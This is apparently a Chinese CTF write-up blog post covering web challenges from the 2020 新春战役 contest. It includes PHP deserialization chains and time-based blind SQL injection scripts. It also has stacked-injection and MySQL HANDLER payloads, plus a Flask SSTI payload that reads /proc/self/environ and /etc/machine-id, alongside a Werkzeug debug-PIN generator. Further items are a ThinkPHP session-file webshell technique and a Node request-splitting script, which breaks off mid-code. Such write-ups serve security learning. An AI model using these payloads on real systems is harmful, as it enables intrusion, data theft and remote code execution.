<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>safe函数还会改变序列化后的值，如果序列化内容有数组里的字符串，那么序列化后的值就会变长，我们可以利用这点和php反序列化的容错性来构造反序列化链，</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222162442935.png" alt="image-20200222162442935"></p>
<p>通过反序列化最后触发login()，返回admin的密码，登录得到flag。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">public</span> $password = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">public</span> $mysqli;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $id;</span><br><span class="line">	<span class="keyword">public</span> $newinfo;</span><br><span class="line">	<span class="keyword">public</span> $sql;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo, $sql)</span> </span>&#123;</span><br><span class="line">		$newInfo = unserialize($newInfo);</span><br><span class="line">		$upDate = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $age;</span><br><span class="line">	<span class="keyword">public</span> $nickname;</span><br><span class="line">	<span class="keyword">public</span> $CtrlCase;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age, $nickname)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $argument)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//echo $argument[0];</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">public</span> $nickname;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname); <span class="comment">//危</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$i1 = <span class="keyword">new</span> Info(<span class="string">"23"</span>,<span class="string">"ddd"</span>);</span><br><span class="line">$i1-&gt;CtrlCase=$user;</span><br><span class="line">$n=<span class="keyword">new</span> User();</span><br><span class="line">$n-&gt;nickname=$i1;</span><br><span class="line">$n-&gt;age=<span class="string">'select "1", "21232f297a57a5a743894a0e4a801fc3"'</span>;</span><br><span class="line">$up=<span class="keyword">new</span> UpdateHelper(<span class="keyword">NULL</span>,<span class="string">"ddd"</span>);</span><br><span class="line">$up-&gt;sql=$n;</span><br><span class="line">$i = <span class="keyword">new</span> Info(<span class="string">"23"</span>,$up);</span><br><span class="line"><span class="keyword">echo</span> serialize($i);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是计算了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125; </span><br><span class="line">这段长度是373</span><br></pre></td></tr></table></figure>

<p>我们加一个<code>*</code>替换成<code>hacker</code>后就会多5个字符，所以要添加74个<code>*</code>加1个<code>into</code>加1个<code>union</code>正好<code>74*5+1*2+1*1=373</code>。</p>
<p>在本地调试的时候</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223095156234.png" alt="image-20200223095156234"></p>
<p>谷歌一下是因为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:455:&quot;**************************************************************************unioninto&quot;;s:8:&quot;nicknami&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;&quot;;s:8:&quot;nickname&quot;;s:4:&quot;dddd&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>上面的$nickname是一个Object,所以报错，我们把payload中的nickname改为同长度的其他变量名即可。</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223231606959.png" alt="image-20200223231606959"></p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤了<code>select = &gt; &lt;</code>等。 </p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://b2aa87e875e24d8594bc523bf9ca972ed4b62c6107cb493d.changame.ichunqiu.com/?id="</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">dic=<span class="string">"qwertyuiopasdfghjklzxcvbnm1234567890&#123;&#125;-"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">	<span class="keyword">for</span> mid <span class="keyword">in</span> dic:</span><br><span class="line">		payload=<span class="string">r"if(ascii(substr(fl4g,&#123;&#125;,1))%20regexp%20&#123;&#125;,sleep(2),0)"</span></span><br><span class="line">		url_1=url+payload.format(i,ord(mid))</span><br><span class="line">		print(payload.format(i,ord(mid)))</span><br><span class="line">		start_time=time.time()</span><br><span class="line">		r=requests.get(url_1)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		end_time=time.time()</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> end_time-start_time&gt;=<span class="number">2</span>:</span><br><span class="line">			flag+=mid</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day_2"></a>Day_2</h2><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>考点：堆叠注入</p>
<p>打开题目给了源码，</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222150130260.png" alt="image-20200222150130260"></p>
<p>这里说一下sql的预编译和模拟预编译，</p>
<ul>
<li><p>采用预编译时，会先将待执行的sql语句中的参数值用占位符来替代，当有占位符的sql语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。这样也来，向模板中传入的输入值，都会被当成字符串，可以杜绝sql注入的产生。</p>
<p>预制语句的SQL语法基于三个SQL语句：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">prepare</span> stmt_name <span class="keyword">from</span> preparable_stmt;</span><br><span class="line"><span class="keyword">execute</span> stmt_name [<span class="keyword">using</span> @var_name [, @var_name] ...];</span><br><span class="line">&#123;deallocate | drop&#125; prepare stmt_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p>模拟预编译是为了一些不支持预编译的数据库设置的，客户端程序内部模拟sql数据库中参数绑定的过程。</p>
</li>
</ul>
<p>PDO在默认情况下，是允许多句执行和模拟预编译的，题目源码中在声明PDO实例的时候没有指定不允许多语句执行，不允许模拟预编译。所以这道题可以通过堆叠注入解。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">url = <span class="string">"http://a6f0af74cb42409c8b829fdba30975255144c88cd6c54dd0.changame.ichunqiu.com/?id"</span></span><br><span class="line">string = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;-,"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        s = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        yuju=<span class="string">"select sleep(3*(ascii(mid((select fllllll4g from table1),&#123;&#125;,1))=&#123;&#125;));"</span></span><br><span class="line">        yuju=yuju.format(i,ord(j))</span><br><span class="line">        payload=<span class="string">"=0%df' ;SET%20@SQL=0x&#123;&#125;;PREPARE exesql FROM @SQL;EXECUTE exesql;"</span>.format(yuju.encode(<span class="string">"hex"</span>))</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        st_time=time.time()</span><br><span class="line">        r = requests.get(url+payload)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        e_time=time.time()</span><br><span class="line">        <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">if</span> e_time-st_time &gt;=<span class="number">3</span>:</span><br><span class="line">			password = password + j</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment">#fllllll4g</span></span><br></pre></td></tr></table></figure>

<p>总结一下可以堆叠注入的场景</p>
<ul>
<li>Mysqli的multi_query()</li>
<li>PDO默认情况下的query()</li>
</ul>
<p>参考链接</p>
<p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">从宽字节注入认识PDO的原理和正确使用</a></p>
<p><a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">https://xz.aliyun.com/t/3950</a></p>
<p><a href="https://xz.aliyun.com/t/7132" target="_blank" rel="noopener">https://xz.aliyun.com/t/7132</a></p>
<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>考点 ：mysql新特性handler</p>
<p>打开题目，界面和强网杯的随便注界面类似，但是过滤了 set、prepare等字段。所以需要采用新的方法来绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>之前看一叶飘零师傅的博客里的FudanCTF某道题时，里面用了handler这个新特性：</p>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222154705385.png" alt="image-20200222154705385"></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inject&#x3D;0%27;show%20tables;</span><br><span class="line">inject&#x3D;0%27;handler%20&#96;FlagHere&#96;%20open%20as%20&#96;ss&#96;;handler%20&#96;ss&#96;%20read%20next;</span><br></pre></td></tr></table></figure>

<h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>考点  ：sys.schema_table_statistics_with_buffer查列名  无列名按位爆破字段。</p>
<p>过滤了 in 所以常规方法查表名，列名都不可以了。用sys.schema_table_statistics_with_buffer来查。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">url = <span class="string">"http://42b9a14929e64c8daf5f5f5a9380b26366da480841da49c6.changame.ichunqiu.com/"</span></span><br><span class="line">string = <span class="string">",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;-,abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        payload=<span class="string">"ascii(mid((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))-&#123;&#125;"</span>.format(i,j)</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">" Nu1L"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			password = password + chr(j+<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>不知道列名，用无列名注入，有过滤了union select ,怎么试都没绕过。然后翻大佬的博客，看到按位爆破方法。参考链接，但是文中的方法在本题有点问题，需要边修改边跑，还可以用十六进制来爆破，这里贴一下十六进制爆破的脚本。</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222230548963.png" alt="image-20200222230548963"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">url = <span class="string">"http://af4fcae52ce5463583151b28d2d6921e2843633f7f304a41.changame.ichunqiu.com/"</span></span><br><span class="line">string = <span class="string">"a-0123456789abcdefghijklmnopqrestuvwxyz_&#123;&#125;~"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"ascii((select (select 1,0x&#123;&#125;)&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1)))-48"</span>.format(password+chr(j).encode(<span class="string">"hex"</span>))</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">        <span class="keyword">print</span> r.status_code</span><br><span class="line">        <span class="keyword">if</span> <span class="string">" Nu1L"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            password = password + chr(j<span class="number">-1</span>).encode(<span class="string">"hex"</span>)</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day_3"></a>Day_3</h2><h3 id="Flask-app"><a href="#Flask-app" class="headerlink" title="Flask_app"></a>Flask_app</h3><p>考点：flask ssti  , 计算pin码</p>
<p>题目环境是python3 ,ssti payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读文件，依次读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address  #w网卡地址，然后转十进制</span><br><span class="line">&#x2F;etc&#x2F;machine-id              #machine-id</span><br></pre></td></tr></table></figure>

<p>然后利用exp生成PIN码，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span></span><br><span class="line">     <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957892'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'f3a3a05c96a0a5b36f1af8b3648ad398dc6650ca286ce8c0a39c61bfbbee99b2'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>到/console下，运行命令读flag</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/4XYIL%7BC99$TRWEC41%7DXFOEN.png" alt="img"></p>
<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>扫目录，给了源码，thinkphp6.0,看到</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223220611167.png" alt="image-20200223220611167"></p>
<p>开了session,可以利用之前的session文件写入，大致测试下功能，看下源码，</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223220843928.png" alt="image-20200223220843928"></p>
<p>search 可以将我们的输入存到session中。</p>
<p>然后先将PHPSESSID改为后缀为php，这样就可以生成sess_xxxxx.php，首先搜索</p>
<p><code>&lt;?php phpinfo(); ?&gt;</code></p>
<p>可以看到有disabled_function，然后传一个一句话，用蚁剑连上，上传一个之前很火的绕过php7大多版本的脚本，执行/readflag，完事。</p>
<h3 id="Node-game"><a href="#Node-game" class="headerlink" title="Node_game"></a>Node_game</h3><p>这题是改的nullcon HackIM 的一道题，仿着别人的wp,半天没做出来，最后看出题人的博客</p>
<p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/#HackTM-CTF-2020-Draw-with-us" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/#HackTM-CTF-2020-Draw-with-us</a>,</p>
<p>漏洞的原理就是，node8及8以下的版本在设计上有缺陷，在发送的url请求中含有特殊构造的非ascii字符，node 在处理这样的请求时，会将其采用<code>latin1</code>编码，并且会把前面构造的特殊字符转换位HTTP控制字符，形如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;query?param&#x3D;1\u&#123;0120&#125;HTTP&#x2F;1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:\u&#123;0120&#125;127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;Connection:\u&#123;0120&#125;keep-alive\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET</span><br></pre></td></tr></table></figure>

<p>会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;query?param&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">GET</span><br></pre></td></tr></table></figure>

<p>这里贴一下5am3师傅的脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">shellCodeRaw=<span class="string">"\r\n"</span></span><br><span class="line"><span class="keyword">var</span> shellCodeRawList = shellCodeRaw.split(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">var</span> shellCodeAsciiList= [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellCodeRawList.length;i++)&#123;</span><br><span class="line">	tmp = shellCodeRawList[i].charCodeAt()</span><br><span class="line">	shellCodeAsciiList.push(tmp.toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode=shellCodeAsciiList.join(<span class="string">"&#125;\\u&#123;01"</span>);</span><br><span class="line">shellcode= <span class="string">"\\u&#123;01"</span>+shellcode+<span class="string">"&#125;"</span></span><br><span class="line"></span><br><span 